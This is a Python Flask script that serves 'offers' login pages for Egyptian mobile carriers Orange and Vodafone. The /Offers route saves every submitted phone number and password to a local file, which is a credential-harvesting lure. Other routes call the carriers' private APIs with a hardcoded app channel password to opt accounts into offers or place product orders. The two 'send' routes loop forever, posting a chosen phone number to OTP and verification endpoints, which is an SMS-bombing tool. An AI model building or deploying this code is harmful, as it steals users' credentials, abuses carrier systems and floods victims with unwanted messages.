import os
try:
	import flask
	import requests
	import bs4
	import random
except:
	os.system("pip install requests")
	os.system("pip install flask")
	os.system("pip install bs4")
	os.system("pip install random")
os.system("clear")

import flask
from flask import Flask, render_template,request
import requests,time,random,string
from bs4 import BeautifulSoup
import webbrowser
website=webbrowser.open("http://127.0.0.1:5000")
print(website)

app=flask.Flask(__name__)
#_________________________________________
@app.route("/")

def sh():
	return render_template("Home_page.html",website="website")
#_______________________________________	
@app.route("/offers")	
def offers2():
		return render_template("login1.html")
		
@app.route("/Offers",methods=["POST"])
def Offers():
	with requests.Session()as req:
		number_sherif=request.form["name"]
		password_sherif=request.form["name2"]
		with open("OrangeOffers",mode="a")as f:
			f.write(number_sherif+"\n"+password_sherif+"\n")
		
		url="https://services.orange.eg/SignIn.svc/SignInUser"
		
		head={"Content-Type": "application/json; charset=UTF-8",
		"Content-Length": "167",
		"Host": "services.orange.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/3.14.9"}
		
		
		data='{"appVersion":"6.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"'+number_sherif+'","isAndroid":true,"password":"'+password_sherif+'"}'
		
		r=req.post(url,headers=head,data=data)
		
		if r.json()["SignInUserResult"]["ErrorDescription"]=="Success":
			print( "<h1>تم الدخول بنجاح</h1>")
			
			#return render_template("Orange.html",L=do)
		else:
			
			return "<center><br><br><h1>الرقم  او الباسورد غلط تاكد من الرقم او الباسورد الصحيح</h1></center>"
			#return render_template("Orange.html",L=m)
					
		url1="https://services.orange.eg/APIs/Promotions/api/HashOneHash/GetOffers"
		
		head= {#"_ctv": ctv,
		#"_htv": htv,
		"IsEasyLogin": "false",
		"OsVersion": "9",
		"AppVersion": "6.2.0",
		"IsAndroid": "true",
		"Content-Type": "application/json; charset\u003dUTF-8",
		"Content-Length": "145",
		"Host": "services.orange.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/3.14.9"}
		sherif1='{"ChannelName":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF","Dial":"'+number_sherif+'","Language":"ar","OfferId":28,"Password":"'+password_sherif+'"}'
		r=req.post(url1,headers=head,data=sherif1).json()
		#sub=("youtube")
		
		#return render_template("Orange.html",res=sub)
		re=(r["Offers"])
		
		return render_template("Orange.html",res=re)
		
#_________________________________________
@app.route("/Gonet")
def gonet():
	return render_template("orang_homepage2.html")
	
@app.route("/Gosuper",methods=["POST"])
def gosuper():
	
	number1=request.form["number1"]
	number2=request.form["password2"]
	
	with requests.Session()as req:
		
		url="https://services.orange.eg/SignIn.svc/SignInUser"
		head={"Content-Type": "application/json; charset=UTF-8",
		"Content-Length": "167",
		"Host": "services.orange.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/3.14.9"}
		
		data='{"appVersion":"6.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"'+number1+'","isAndroid":true,"password":"'+number2+'"}'
		r=req.post(url,headers=head,data=data)
		print(r)
		
		if r.json()["SignInUserResult"]["ErrorDescription"]=="Success":
			print("<h1>تم الدخول بنجاح</h1>")
		else:
			return "<center><br><br><h1>الرقم  او الباسورد غلط تاكد من الرقم او الباسورد الصحيح</h1></center>"
		#ctv=input("enter ctv : ")
		#htv=input("enter htv : ")
		print("*"*60)	
		url1="https://services.orange.eg/APIs/Promotions/api/HashOneHash/OptIn"
		
		head= {#"_ctv": "76e52620-f165-49a5-8a12-5a726ba08b15",
		#"_htv": "15A06E8763D3D99A470A7B295590DFD65ED1EE9D9508E6F8C11879B89478ACB8",
		"IsEasyLogin": "false",
		"OsVersion": "9",
		"AppVersion": "6.2.0",
		"IsAndroid": "true",
		"Content-Type": "application/json; charset\u003dUTF-8",
		"Content-Length": "145",
		"Host": "services.orange.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/3.14.9"}
		
		sherif1='{"ChannelName":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF","Dial":"'+number1+'","Language":"ar","OfferId":4,"Password":"'+number2+'"}'
		r2=req.post(url1,headers=head,data=sherif1).json()
		re=(r2["ErrorDescription"])
		return render_template("Orange.html",res=re)
		
	

#_________________________________________
@app.route("/Orange3g")	
def login1():
	return render_template("login2.html")

@app.route("/orange",methods=["POST"])
def rang():
	
	with requests.Session()as req:
		number_sherif=request.form["name"]
		password_sherif=request.form["name2"]
		
		url="https://services.orange.eg/SignIn.svc/SignInUser"
		
		head={"Content-Type": "application/json; charset=UTF-8",
		"Content-Length": "167",
		"Host": "services.orange.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/3.14.9"}
		
		
		data='{"appVersion":"6.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"'+number_sherif+'","isAndroid":true,"password":"'+password_sherif+'"}'
		
		r=req.post(url,headers=head,data=data)
		
		if r.json()["SignInUserResult"]["ErrorDescription"]=="Success":
			print( "<h1>تم الدخول بنجاح</h1>")
			
			#return render_template("Orange.html",L=do)
		else:
			
			return "<center><br><br><h1>الرقم  او الباسورد غلط تاكد من الرقم او الباسورد الصحيح</h1></center>"
			#return render_template("Orange.html",L=m)
					
		url1="https://services.orange.eg/APIs/Promotions/api/HashOneHash/OptIn"
		
		head= {#"_ctv": ctv,
		#"_htv": htv,
		"IsEasyLogin": "false",
		"OsVersion": "9",
		"AppVersion": "6.2.0",
		"IsAndroid": "true",
		"Content-Type": "application/json; charset\u003dUTF-8",
		"Content-Length": "145",
		"Host": "services.orange.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/3.14.9"}
		sherif1='{"ChannelName":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF","Dial":"'+number_sherif+'","Language":"ar","OfferId":28,"Password":"'+password_sherif+'"}'
		r=req.post(url1,headers=head,data=sherif1).json()
		#sub=("youtube")
		
		#return render_template("Orange.html",res=sub)
		re=(r["ErrorDescription"])
		
		return render_template("Orange.html",res=re)
		
#_______________________________________			

@app.route("/Vodafone")	
def login3():
		return render_template("login3.html")		

@app.route("/Vodafone",methods=["POST"])
def voda():
	number=request.form["name"]
	password=request.form["name2"]
	
	with requests.Session() as req:
	       def generationLink(stringLingth):
	       	
	       	return ''.join(random.choice(string.ascii_lowercase) for i in range(stringLingth))
	       #-------------------------------------------------------------
	       url = f'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/auth?client_id=website&redirect_uri=https%3A%2F%2Fweb.vodafone.com.eg%2Far%2FKClogin&state=286d1217-db14-4846-86c1-9539beea01ed&response_mode=query&response_type=code&scope=openid&nonce={generationLink(10)}&kc_locale=en'
	       
	       responsePageLogin = req.get(url)
	       
	       #------------------------------------------------------
	       
	       soup = BeautifulSoup(responsePageLogin.content, 'html.parser')
	       #------------------------------------------------------
	       getUrlAction = soup.find('form').get('action')
	       #-------------------------------------------------------
	       headerRequest = {
	       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	       'Accept-Encoding': 'gzip, deflate, br',
	       'Accept-Language': 'en-GB,en;q=0.9,ar;q=0.8,ar-EG;q=0.7,en-US;q=0.6',
	       'Connection': 'keep-alive',
	       'Content-Type': 'application/x-www-form-urlencoded',
	       'Host': 'web.vodafone.com.eg',
	       'Origin': 'https://web.vodafone.com.eg',
	       'Referer': url,
	       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'
	       }
	       #------------------------------------------------------
	       formData = {
	       'username':number,
	       'password':password
	       }
	       #------------------------------------------------------------    
	       sendUserData = req.post(getUrlAction,headers=headerRequest,data=formData)
	       checkRegistry = sendUserData.url
	       _checkRegistry = checkRegistry.find('KClogin')
	       #-------------------------------------------------------
	       if _checkRegistry != -1:
	       	code = checkRegistry
	       	_code = code[code.index('code=') + 5:]
	       #------------------------------------------------------
	       header = {
	       'Accept': '*/*',
	       'Accept-Encoding': 'gzip, deflate, br',
	       'Accept-Language': 'en-GB,en;q=0.9,ar;q=0.8,ar-EG;q=0.7,en-US;q=0.6',
	       'Connection': 'keep-alive',
	       'Content-type': 'application/x-www-form-urlencoded',
	       'Host': 'web.vodafone.com.eg',
	       'Origin': 'https://web.vodafone.com.eg',
	       'Referer': 'https://web.vodafone.com.eg/ar/KClogin',
	       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'
	       }
	       #------------------------------------------------------
	       formDataAccessToken = {
	       'code': _code,
	       'grant_type': 'authorization_code',
	       'client_id': 'website',
	       'redirect_uri': 'https://web.vodafone.com.eg/ar/KClogin'
	       }
	       
	       sendDataAccessToken = req.post('https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token',headers=header,data=formDataAccessToken)
	       access_token = sendDataAccessToken.json()['access_token']
	       
	       url="https://web.vodafone.com.eg/services/dxl/pom/productOrder"
	       head={
	       "Host": "web.vodafone.com.eg",
	       "Connection": "keep-alive",
	       "Content-Length": "572",
	       "msisdn": f"{number}",
	       "Accept-Language": "AR",
	       "Authorization": f"Bearer {access_token}",
	       "Content-Type": "application/json",
	       "Accept": "application/json",
	       "clientId": "WebsiteConsumer",
	       "x-dtpc": "22$427338578_684h28vTHEBCKSENWQQDCJCBVQQPLHKGNHDIHWD-0e0",
	       "User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
	       "Sec-Fetch-Dest": "empty",
	       "Origin": "https://web.vodafone.com.eg",
	       "Sec-Fetch-Site": "same-origin",
	       "Sec-Fetch-Mode": "cors",
	       "Referer": "https://web.vodafone.com.eg/spa/flexManagement/internet",
	       "Accept-Encoding": "gzip, deflate, br",
	       }
	       data='{"channel":{"name":"MobileApp"},"orderItem":[{"action":"add","product":{"characteristic":[{"name":"ExecutionType","value":"Sync"},{"name":"LangId","value":"en"},{"name":"OneStepMigrationFlag","value":"Y"},{"name":"DropAddons","value":"True"}],"relatedParty":[{"id":"%s","name":"MSISDN","role":"Subscriber"}],"id":"MI_BA_XC_SC_7","@type":"MI","encProductId":"6Bfuomq5nD4A3m93ZQswDSWdk6tgxkdpcpXzdGdHBcAx3PVKIhu8yPc3VD3RmbZUQmA02N2Ork5AWJiEEsmK86E04rSGo2uzNnhoCEjCgobcDuWN4gzpT/4zJK8Uum/80voHebqUOB1gqaEzHAUB6X9vIVJDBdjPK75JYbqrsJtOB7UvBg=="}}],"@type":"MIProfile"}'%(number)
	       r=req.post(url,headers=head,data=data)
	       if r.text.find("state")=="Completed":
	       	return '''<h1>ok</h1>'''
	       else:
	       	return '''<h1>no</h1>'''
	       	
#___________________________
@app.route("/sendorange")	
def login4():
	return render_template("sendsms1.html")		

@app.route("/send",methods=["POST"])
def sendOrg():
    number=request.form["name"]
    while True:
    	url = "http://oleorange.com/login"
    	head = {
    	"Host": "oleorange.com",
    	"Connection": "keep-alive",
    	"Content-Length": "457",
    	"Cache-Control": "max-age=0",
    	"Origin": "http://oleorange.com",
    	"Upgrade-Insecure-Requests": "1",
    	"Content-Type": "application/x-www-form-urlencoded",
    	"User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
    	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    	"Referer": "http://oleorange.com/login",
    	"Accept-Encoding": "gzip, deflate",
    	"Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"}
    	data=f'__LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=XI%2FgNjYp11X0Sdu1Iw%2BdiI99XzxXpWnYaoMoeiXaa4DTmgKxUdeBNixe4CVOBmBn1TcdoqIbdDpDY6cWZo6XkW%2FMoc0J%2B1cNUEm%2FvQzQAcs%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=jCjP%2Be7i1qwBrqf2khlefeEUUD8DHE0Ti4G3u5PLJUjGjn1dRoUi1XPyTl4zc%2Bd9k7jXq6bzzWnzKwDfCbvsSuC84jEP5s%2FTy38SDK1YAQqONLBhCC0rZL818RUruiJ3iqiJqdE4JOCWy6pj%2FDBhzQ%3D%3D&txtPhone={number}&btnLogin=%D8%A7%D9%84%D8%AF%D8%AE%D9%88%D9%84'
    	sh=requests.post(url,headers=head,data=data).status_code
    	s=(sh,"done")
    	#return render_template("po.html",m=s)
    
			
#_______________________________________									
'''
خاصة بعمل باسورد الموقع@app.route("/sendorange",methods=["POST", "GET"])
def sendorange():
		if request.method== "POST":
				return render_template("sendsms1.html")'''
#___________________________		

@app.route("/sendvodafone")
def sendvoda():
	return render_template("sendsms2.html")

@app.route("/vodasend",methods=["POST"])
def sendvodafone():
	number=request.form["name"]
	while True:
	   
	   url = "https://app-api.starzplay.com/api/auth/phoneVerification?repeat=false&lang=ar"
	   headers = {
	   "Host": "app-api.starzplay.com",
	   "content-length": "106",
	   "sec-ch-ua": "\"Chromium\";v\u003d\"106\", \"Google Chrome\";v\u003d\"106\", \"Not;A\u003dBrand\";v\u003d\"99\"",
	   "accept": "application/json, text/plain, */*",
	   "content-type": "application/json;charset\u003dUTF-8",
	   "sec-ch-ua-mobile": "?1",
	   "user-agent": "Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
	   "client-type": "website",
	   "sec-ch-ua-platform": "\"Android\"",
	   "origin": "https://starzplay.com",
	   "sec-fetch-site": "same-site",
	   "sec-fetch-mode": "cors",
	   "sec-fetch-dest": "empty",
	   "referer": "https://starzplay.com/",
	   "accept-encoding": "gzip, deflate, br",
	   "accept-language": "ar-EG,ar;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"}
	   
	   data = '{"phoneNumber":"'+number+'","paymentType":"vodafone_eg_week","paymentPlanId":25,"channel":"vodafone_eg"}'
	   sh=requests.post(url,headers=headers,data=data)
	   voda=(sh,"done")
	   #return render_template("po.html",m=voda)	
		
				
if __name__=="__main__" :
	app.run(debug=True,port=5000)